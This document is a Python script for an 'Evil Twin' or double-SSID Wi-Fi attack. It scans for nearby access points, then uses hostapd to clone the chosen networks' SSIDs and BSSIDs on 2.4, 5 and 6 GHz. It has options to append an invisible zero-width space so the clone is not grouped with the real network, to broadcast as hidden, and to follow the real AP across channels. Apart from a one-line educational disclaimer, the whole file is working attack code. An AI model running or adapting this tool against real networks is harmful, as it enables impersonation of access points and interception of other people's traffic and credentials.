#!/usr/bin/env python3
"""
================================================================================
Double_SSID_Attack_Tool  (with 6 GHz / Wi-Fi 6E Support & Freq Workaround)
================================================================================
Execution rights must be set: chmod +x Double_SSID_Attack_Tool_WPA2_WPA3_Updated.py
Start the script with: sudo python3 Double_SSID_Attack_Tool_WPA2_WPA3_Updated.py
FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
"""
import subprocess
import os
import time
import sys
import re
import threading
import signal
import shutil
import csv

# --- Configuration ---
CLONE_PASSWORD = "1234567a"
USE_MULTI_SSID = False # Automatically set to 'n' (False)

# ---- hostapd Configuration Templates ----
HOSTAPD_CONF_TEMPLATE_PRIMARY = """\
interface={interface}
driver=nl80211
ssid={ssid}
ignore_broadcast_ssid={hidden_val}
hw_mode={hw_mode}
channel={channel}
bssid={bssid}
country_code=PA
ieee80211d=1
auth_algs=1
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK SAE
rsn_pairwise=CCMP
ieee80211n=1
wmm_enabled=1
ieee80211w={pmf}
{extra_6ghz}"""

HOSTAPD_CONF_TEMPLATE_VIRTUAL = """\
bss={interface}_{index}
ssid={ssid}
ignore_broadcast_ssid={hidden_val}
bssid={bssid}
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK SAE
rsn_pairwise=CCMP
ieee80211w={pmf}
{extra_6ghz}"""

OUI_FILE_PATHS =[
    '/usr/share/ieee-oui/oui.txt',
    '/usr/share/hwdata/oui.txt',
    '/var/lib/ieee-data/oui.txt'
]

def get_hw_mode(channel):
    """Returns hostapd hw_mode: 'g' for 2.4 GHz, 'a' for 5/6 GHz."""
    return 'g' if channel <= 14 else 'a'

def get_op_class(is_6ghz, bandwidth_mhz=80):
    """Returns the hostapd op_class for 6 GHz channels."""
    if not is_6ghz:
        return None
    bw_map = {20: 131, 40: 132, 80: 133, 160: 134}
    return bw_map.get(bandwidth_mhz, 133)

def build_6ghz_extras(is_6ghz, bandwidth_mhz=80):
    """Builds the 6 GHz specific hostapd config block."""
    if not is_6ghz:
        return ""
    op_class = get_op_class(is_6ghz, bandwidth_mhz)
    return (
        f"ieee80211ax=1\n"
        f"op_class={op_class}\n"
        f"he_su_beamformer=1\n"
        f"he_su_beamformee=1\n"
        f"he_mu_beamformer=1\n"
    )

def get_airodump_scan_args(include_6ghz=False, as_string=False):
    """
    Returns the airodump-ng scan arguments.
    Uses '--band abg' for normal scans.
    Uses '-C <frequencies>' as a workaround for 6GHz, matching airgeddon's approach.
    """
    if not include_6ghz:
        return "--band abg" if as_string else["--band", "abg"]

    freqs =[]
    # 2.4 GHz
    for ch in range(1, 14):
        freqs.append(str(2407 + (5 * ch)))
    freqs.append("2484")

    # 5 GHz
    channels_5g =[36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    for ch in channels_5g:
        freqs.append(str(5000 + (5 * ch)))

    # 6 GHz (Channels 1 to 233, step 4) -> Includes 221, 225, 229, 233
    for ch in range(1, 234, 4):
        freqs.append(str(5955 + (5 * (ch - 1))))

    freq_str = ",".join(freqs)
    return f"-C {freq_str}" if as_string else["-C", freq_str]

def check_dependencies():
    deps =['iw', 'ip', 'rfkill', 'airmon-ng', 'hostapd', 'airodump-ng', 'xterm']
    print("[*] Checking dependencies...")
    if not all(shutil.which(dep) for dep in deps):
        raise SystemExit("[-] Critical error: One or more required tools are missing.")
    print("[+] All dependencies are satisfied.")

def check_root():
    if os.geteuid() != 0:
        raise SystemExit("[-] Error: This script must be run with sudo privileges.")

def prepare_system():
    print("[*] Preparing system for the attack...")
    subprocess.run(['rfkill', 'unblock', 'wifi'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    print("[+] System is ready.")

def cleanup_system():
    print("\n[*] Restarting network services...")
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Network services have been restarted.")

def load_oui_data():
    oui_data = {}
    for path in OUI_FILE_PATHS:
        try:
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    if '(hex)' in line:
                        parts = line.split(maxsplit=2)
                        if len(parts) >= 3:
                            oui_data[parts[0].replace('-', '')] = parts[2].strip()
            if oui_data:
                print("[+] OUI database successfully loaded.")
                return oui_data
        except FileNotFoundError:
            continue
    print("[-] OUI database not found. Manufacturer info will not be displayed.")
    return None

def get_oui_manufacturer(bssid, oui_data):
    if not oui_data:
        return "N/A"
    oui_prefix = bssid.replace(':', '').upper()[:6]
    return oui_data.get(oui_prefix, "Unknown")

def find_wireless_interfaces():
    interfaces =[]
    try:
        result = subprocess.check_output(['airmon-ng'], stderr=subprocess.DEVNULL).decode('utf-8')
        lines = result.splitlines()
        header_index = next(
            (i for i, line in enumerate(lines) if 'Interface' in line and 'Chipset' in line), -1
        )
        if header_index != -1:
            for line in lines[header_index + 1:]:
                parts = line.split()
                if len(parts) >= 4:
                    interfaces.append({'name': parts[1], 'chipset': ' '.join(parts[3:])})
        if interfaces:
            return interfaces
    except (FileNotFoundError, subprocess.CalledProcessError):
        pass
    print("[-] airmon-ng could not be used. Showing interface names only.")
    try:
        names = re.findall(
            r'Interface\s+([a-zA-Z0-9]+)',
            subprocess.check_output(['iw', 'dev'], stderr=subprocess.DEVNULL).decode('utf-8')
        )
        return[{'name': name, 'chipset': 'N/A'} for name in names]
    except (FileNotFoundError, subprocess.CalledProcessError):
        return[]

def check_interface_6ghz_support(interface):
    try:
        result = subprocess.check_output(['iw', 'dev', interface, 'info'], stderr=subprocess.DEVNULL
        ).decode('utf-8')
        phy_match = re.search(r'wiphy\s+(\d+)', result)
        if phy_match:
            phy = f"phy{phy_match.group(1)}"
            channels_out = subprocess.check_output(['iw', phy, 'channels'], stderr=subprocess.DEVNULL
            ).decode('utf-8')
            if re.search(r'5955(\.0)?\s+MHz', channels_out, re.IGNORECASE):
                return True
    except Exception:
        pass
    return False

def set_interface_mode(interface, mode="monitor"):
    print(f"[*] Putting {interface} into {mode} mode...")
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['iw', 'dev', interface, 'set', 'type', mode], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except subprocess.CalledProcessError:
        print(f"[-] Error setting {mode} mode for {interface}.")
        return False

def ensure_interface_up(interface):
    print(f"[*] Activating interface {interface}...")
    try:
        subprocess.run(['rfkill', 'unblock', 'wifi'], stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        print(f"[-] Error activating {interface}.")
        return False

def prepare_adapter_for_ap(interface):
    if interface.endswith("mon"):
        print(f"[*] Preparing attack interface {interface} (stopping monitor mode)...")
        try:
            subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            potential_real_name = interface.replace("mon", "")
            check = subprocess.run(['ip', 'link', 'show', potential_real_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if check.returncode == 0:
                print(f"[+] Interface reset to: {potential_real_name}")
                return potential_real_name
            return interface
        except Exception:
            return interface
    return interface

def kill_proc_robust(p, interface_name=None):
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            for _ in range(10):
                if p.poll() is not None:
                    break
                time.sleep(0.1)
            if p.poll() is None:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
    if interface_name:
        try:
            subprocess.run(['pkill', '-9', '-f', f'hostapd.*{interface_name}'], stderr=subprocess.DEVNULL)
        except Exception:
            pass

def parse_airodump_csv(csv_path):
    access_points =[]
    try:
        if not os.path.exists(csv_path):
            return[]
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.read().splitlines()
        ap_section_index = next((i for i, line in enumerate(lines) if 'BSSID, First time seen' in line), -1)
        if ap_section_index == -1:
            return[]
        ap_lines = lines[ap_section_index + 1:]
        client_section_index = next((i for i, line in enumerate(ap_lines) if 'Station MAC, First time seen' in line), -1)
        if client_section_index != -1:
            ap_lines = ap_lines[:client_section_index]
        reader = csv.reader(ap_lines)
        for row in reader:
            try:
                if len(row) < 14:
                    continue
                bssid, channel, essid = row[0].strip(), row[3].strip(), row[13].strip()
                if re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', bssid) and channel.lstrip('-').isdigit():
                    access_points.append({'bssid': bssid, 'channel': int(channel), 'essid': essid})
            except (IndexError, ValueError):
                continue
    except Exception:
        pass
    return access_points

def select_targets_from_scan(monitor_interface, oui_data, scan_6ghz=False):
    scan_prefix = "/tmp/scan_init"
    for f in os.listdir('/tmp/'):
        if f.startswith("scan_init"):
            os.remove(os.path.join('/tmp/', f))

    scan_args = get_airodump_scan_args(scan_6ghz)
    band_label = "2.4 / 5 / 6 GHz (Freq Workaround)" if scan_6ghz else "2.4 / 5 GHz"
    print(f"\n[*] Starting initial network scan ({band_label})...")

    airodump_cmd =[
        'xterm', '-geometry', '100x20', '-T', 'TARGET SELECTION SCANNER',
        '-e', 'airodump-ng'
    ] + scan_args +[
        '--write', scan_prefix, '--output-format', 'csv', monitor_interface
    ]
    
    print("[*] Scan is running in xterm. Close the window when you are done.")
    try:
        p = subprocess.Popen(airodump_cmd, preexec_fn=os.setsid)
        p.wait()
    except FileNotFoundError:
        raise SystemExit("[-] Error: 'xterm' not found.")

    found_aps = parse_airodump_csv(f"{scan_prefix}-01.csv")
    if not found_aps:
        raise SystemExit("[-] No networks found during scan.")

    print("\n--- Found Networks ---")
    for i, ap in enumerate(found_aps):
        essid_display = ap['essid'] or '<HIDDEN/EMPTY>'
        manufacturer = get_oui_manufacturer(ap['bssid'], oui_data)
        print(f"  {i}: BSSID: {ap['bssid']} | CH: {ap['channel']:<4} | ESSID: {essid_display:<20} | Manufacturer: {manufacturer}")

    selected_indices = input("\nSelect target numbers (e.g. '0,2'): ").split(',')
    selected_targets =[]
    for index_str in selected_indices:
        try:
            index = int(index_str.strip())
            if 0 <= index < len(found_aps):
                selected_targets.append(found_aps[index])
        except ValueError:
            pass

    targets =[]
    for target in selected_targets:
        print(f"\n--- Configuring Target: {target['bssid']} ---")

        # ---- ESSID Logik ----
        default_essid = target['essid']
        if not default_essid:
            manual_ssid = input(f"  [?] Enter SSID for {target['bssid']} (hidden network): ").strip()
            target['ssid'] = manual_ssid or "Unknown"
        else:
            print(f"  Scanned ESSID: {default_essid}")
            manual_ssid = input(f"[?] Override SSID manually? [Press Enter to keep '{default_essid}']: ").strip()
            if manual_ssid:
                target['ssid'] = manual_ssid
            else:
                target['ssid'] = default_essid

        # ---- ZWSP / HIDDEN Logik Abfragen ----
        add_zwsp = input("  [?] Append Zero-Width Space (ZWSP) to the SSID to bypass grouping? [y/N]: ").strip().lower()
        if add_zwsp == 'y':
            target['ssid'] += '\u200b'
            print("  [+] Zero-Width Space appended.")

        make_hidden = input("  [?] Should the Evil Twin be a hidden network (<length: 0>)? [y/N]: ").strip().lower()
        target['hidden_val'] = '1' if make_hidden == 'y' else '0'
        if target['hidden_val'] == '1':
            print("  [+] Network will be broadcasted as HIDDEN.")

        new_bssid = input(f"  [?] Change BSSID? [Press Enter to keep {target['bssid']}]: ").strip()
        if new_bssid:
            if re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', new_bssid):
                target['bssid'] = new_bssid
                print(f"  [+] BSSID updated to: {new_bssid}")
            else:
                print("  [!] Invalid BSSID format! Keeping original.")

        new_channel = input(f"  [?] Change channel?[Press Enter to keep {target['channel']}]: ").strip()
        if new_channel and new_channel.isdigit():
            target['channel'] = int(new_channel)
            print(f"  [+] Channel updated to: {target['channel']}")

        ans = input(f"  [?] Is this a 6 GHz (Wi-Fi 6E) target?[y/N]: ").strip().lower()
        target['is_6ghz'] = (ans == 'y')

        if target['is_6ghz']:
            bw_input = input("  [?] Bandwidth for 6 GHz AP?[20 / 40 / 80 / 160, default=80]: ").strip()
            target['bandwidth_6ghz'] = int(bw_input) if bw_input in ('20', '40', '80', '160') else 80
            op_cls = get_op_class(True, target['bandwidth_6ghz'])
            print(f"  [+] 6 GHz bandwidth: {target['bandwidth_6ghz']} MHz (op_class={op_cls})")
        else:
            target['bandwidth_6ghz'] = 80

        targets.append(target)
    return targets

def start_central_scanner(monitor_interface, scan_6ghz=False):
    scan_prefix = "/tmp/central_scan"
    for f in os.listdir('/tmp/'):
        if f.startswith("central_scan"):
            os.remove(os.path.join('/tmp/', f))

    scan_args_str = get_airodump_scan_args(scan_6ghz, as_string=True)
    cmd = f"airodump-ng {scan_args_str} -w {scan_prefix} --output-format csv {monitor_interface}; read"
    args =['xterm', '-geometry', '80x20', '-T', f'CENTRAL SCANNER ({monitor_interface})', '-e', 'bash', '-c', cmd]
    
    print(f"[*] Starting central scanner on {monitor_interface}...")
    return subprocess.Popen(args, preexec_fn=os.setsid)

def run_attack_thread(attack_interface, targets, stop_event, is_multi_ssid, enable_hopping):
    primary_target = targets[0]
    current_channel = primary_target['channel']
    hostapd_proc = None

    def update_ap(channel):
        nonlocal hostapd_proc
        kill_proc_robust(hostapd_proc, attack_interface)

        try:
            subprocess.run(['ip', 'link', 'set', attack_interface, 'down'], stderr=subprocess.DEVNULL)
            subprocess.run(['iw', 'dev', attack_interface, 'set', 'type', 'managed'], stderr=subprocess.DEVNULL)
            subprocess.run(['ip', 'link', 'set', attack_interface, 'up'], stderr=subprocess.DEVNULL)
            time.sleep(0.5)
        except Exception:
            pass

        conf_file = f"/tmp/hostapd_{attack_interface}.conf"
        
        is_6ghz = primary_target.get('is_6ghz', False)
        hw_mode = 'a' if is_6ghz else get_hw_mode(channel)
        bw_6ghz = primary_target.get('bandwidth_6ghz', 80)
        
        extra_cfg = build_6ghz_extras(is_6ghz, bw_6ghz)
        pmf_val = "2" if is_6ghz else "1"

        conf_content = HOSTAPD_CONF_TEMPLATE_PRIMARY.format(
            interface=attack_interface,
            ssid=primary_target['ssid'],
            hidden_val=primary_target.get('hidden_val', '0'),
            hw_mode=hw_mode,
            channel=channel,
            bssid=primary_target['bssid'],
            password=CLONE_PASSWORD,
            pmf=pmf_val,
            extra_6ghz=extra_cfg
        )

        if is_multi_ssid:
            for i, target in enumerate(targets[1:]):
                t_is_6ghz = target.get('is_6ghz', False)
                t_extra_cfg = build_6ghz_extras(t_is_6ghz, target.get('bandwidth_6ghz', 80))
                t_pmf_val = "2" if t_is_6ghz else "1"

                conf_content += "\n" + HOSTAPD_CONF_TEMPLATE_VIRTUAL.format(
                    interface=attack_interface,
                    index=i + 1,
                    ssid=target['ssid'],
                    hidden_val=target.get('hidden_val', '0'),
                    bssid=target['bssid'],
                    password=CLONE_PASSWORD,
                    pmf=t_pmf_val,
                    extra_6ghz=t_extra_cfg
                )

        # WICHTIG: encoding="utf-8" stellt sicher, dass der Zero-Width Space korrekt geschrieben wird
        with open(conf_file, "w", encoding="utf-8") as f:
            f.write(conf_content)

        ap_type = "Multi-SSID" if is_multi_ssid else "Single-SSID"
        # Print SSID without the invisible character for clean console output
        display_ssid = primary_target['ssid'].replace('\u200b', '')
        print(f"[+] [{attack_interface}] Starting {ap_type} AP on CH {channel} | Target: {display_ssid}")

        cmd = f"hostapd {conf_file}; echo '[HOSTAPD STOPPED]'; read"
        args =['xterm', '-geometry', '90x25', '-T', f'ATTACK: {attack_interface} (CH {channel})', '-e', 'bash', '-c', cmd]
        
        time.sleep(1)
        hostapd_proc = subprocess.Popen(args, preexec_fn=os.setsid)

    update_ap(current_channel)

    scan_file = "/tmp/central_scan-01.csv"

    try:
        while not stop_event.is_set():
            if enable_hopping:
                time.sleep(4)
                ap_list = None
                for _ in range(3):
                    ap_list = parse_airodump_csv(scan_file)
                    if ap_list: break
                    time.sleep(0.5)

                if not ap_list: continue

                found_target = next((ap for ap in ap_list if ap['bssid'] == primary_target['bssid']), None)

                if found_target:
                    new_channel = found_target['channel']
                    if new_channel != current_channel:
                        display_ssid = primary_target['ssid'].replace('\u200b', '')
                        print(f"[!][{display_ssid}] Channel change detected: {current_channel} -> {new_channel}")
                        current_channel = new_channel
                        update_ap(current_channel)
            else:
                time.sleep(2)
    finally:
        kill_proc_robust(hostapd_proc, attack_interface)
        try: os.remove(f"/tmp/hostapd_{attack_interface}.conf")
        except Exception: pass

def main():
    print("\n" + "="*80)
    print(" Double SSID Attack Tool Setup")
    print("="*80)
    
    involved_interfaces = set()
    threads =[]
    stop_event = threading.Event()
    central_scanner_proc = None

    try:
        check_root()
        check_dependencies()
        oui_data = load_oui_data()

        use_multi_ssid = USE_MULTI_SSID
        enable_hopping = input("[?] Enable channel tracking? [y/N]: ").strip().lower() == 'y'

        scan_6ghz = input("[?] Include 6 GHz band in scan? (requires Wi-Fi 6E adapter)[y/N]: ").strip().lower() == 'y'
        if scan_6ghz:
            print("[i] 6 GHz scan enabled (Using Frequency Workaround).")

        prepare_system()

        all_ifaces = find_wireless_interfaces()
        if not all_ifaces:
            raise SystemExit("[-] No WiFi adapters found.")

        print("\nAvailable WiFi adapters:")
        for i, iface in enumerate(all_ifaces):
            supports_6g = check_interface_6ghz_support(iface['name'])
            tag = "[6GHz OK]" if supports_6g else ""
            print(f"  {i}: {iface['name']:<10} | Chipset: {iface['chipset']}{tag}")

        scan_idx = int(input("Select adapter for scanner (monitor mode): "))
        scan_iface = all_ifaces[scan_idx]['name']
        involved_interfaces.add(scan_iface)

        set_interface_mode(scan_iface, "monitor")

        targets = select_targets_from_scan(scan_iface, oui_data, scan_6ghz=scan_6ghz)
        if not targets:
            raise SystemExit("[-] No targets selected. Exiting.")

        attack_assignments =[]
        available_attackers =[iface for iface in all_ifaces if iface['name'] != scan_iface]

        if not available_attackers:
            raise SystemExit("[-] No adapters available for the attack interface.")

        if use_multi_ssid:
            grouped = {}
            for t in targets:
                # Group by channel AND 6GHz flag to avoid Channel 1 overlaps
                grouped.setdefault((t['channel'], t.get('is_6ghz', False)),[]).append(t)

            for (channel, is_6ghz), group in grouped.items():
                band_str = "6 GHz" if is_6ghz else "2.4/5 GHz"
                print(f"\n--- Group Channel {channel} ({band_str}) ---")
                for t in group:
                    display_ssid = t['ssid'].replace('\u200b', '')
                    print(f"  Includes: {display_ssid:<15} (BSSID: {t['bssid']})")

                if not available_attackers:
                    raise SystemExit("[-] Not enough adapters for all groups.")

                print("Available adapters:")
                for j, iface in enumerate(available_attackers):
                    supports_6g = check_interface_6ghz_support(iface['name'])
                    tag = "[6GHz OK]" if supports_6g else ""
                    print(f"  {j}: {iface['name']:<10} | {iface['chipset']}{tag}")

                idx = int(input("Select adapter for this group: "))
                chosen = available_attackers.pop(idx)
                attack_assignments.append({'targets': group, 'adapter': chosen['name']})
                involved_interfaces.add(chosen['name'])
        else:
            for i, target in enumerate(targets):
                display_ssid = target['ssid'].replace('\u200b', '')
                print(f"\n--- Target {i + 1} Configuration ---")
                print(f"  SSID:     {display_ssid}")
                print(f"  BSSID:    {target['bssid']}")
                print(f"  Channel:  {target['channel']}")
                print(f"  Hidden:   {'Yes' if target.get('hidden_val') == '1' else 'No'}")
                if target.get('is_6ghz'):
                    op_cls = get_op_class(True, target.get('bandwidth_6ghz', 80))
                    print(f"  op_class: {op_cls}  (Wi-Fi 6E / {target.get('bandwidth_6ghz', 80)} MHz)")

                if not available_attackers:
                    raise SystemExit("[-] Not enough adapters for all targets.")

                print("Available adapters:")
                for j, iface in enumerate(available_attackers):
                    supports_6g = check_interface_6ghz_support(iface['name'])
                    tag = "[6GHz OK]" if supports_6g else ""
                    print(f"  {j}: {iface['name']:<10} | {iface['chipset']}{tag}")

                idx = int(input("Select adapter for this target: "))
                chosen = available_attackers.pop(idx)
                attack_assignments.append({'targets':[target], 'adapter': chosen['name']})
                involved_interfaces.add(chosen['name'])

        for assignment in attack_assignments:
            assignment['adapter'] = prepare_adapter_for_ap(assignment['adapter'])
            ensure_interface_up(assignment['adapter'])

        if enable_hopping:
            central_scanner_proc = start_central_scanner(scan_iface, scan_6ghz=scan_6ghz)
            print("[*] Waiting for scanner initialization (8s)...")
            time.sleep(8)
            if not os.path.exists("/tmp/central_scan-01.csv"):
                print("[!] WARNING: Scanner CSV not yet created. Waiting an additional 5s...")
                time.sleep(5)
        else:
            print("[*] Channel hopping disabled. Monitor interface will remain inactive.")

        print("\n[+] Launching attacks...")
        for assignment in attack_assignments:
            is_multi = use_multi_ssid and len(assignment['targets']) > 1
            t = threading.Thread(
                target=run_attack_thread,
                args=(assignment['adapter'], assignment['targets'], stop_event, is_multi, enable_hopping)
            )
            threads.append(t)
            t.start()
            time.sleep(1)

        print("\n[SUCCESS] Attack is running. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Abort signal received. Stopping...")
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
    finally:
        stop_event.set()
        if central_scanner_proc:
            kill_proc_robust(central_scanner_proc)
        for t in threads:
            t.join(timeout=2)

        print("[*] Cleaning up interfaces...")
        for iface in involved_interfaces:
            try:
                subprocess.run(['airmon-ng', 'stop', iface], stderr=subprocess.DEVNULL)
                real_name = iface.replace("mon", "")
                subprocess.run(['ip', 'link', 'set', real_name, 'down'], stderr=subprocess.DEVNULL)
                subprocess.run(['iw', 'dev', real_name, 'set', 'type', 'managed'], stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', real_name, 'up'], stderr=subprocess.DEVNULL)
            except Exception:
                pass

        cleanup_system()
        print("[+] Done. Goodbye.")

if __name__ == "__main__":
    main()
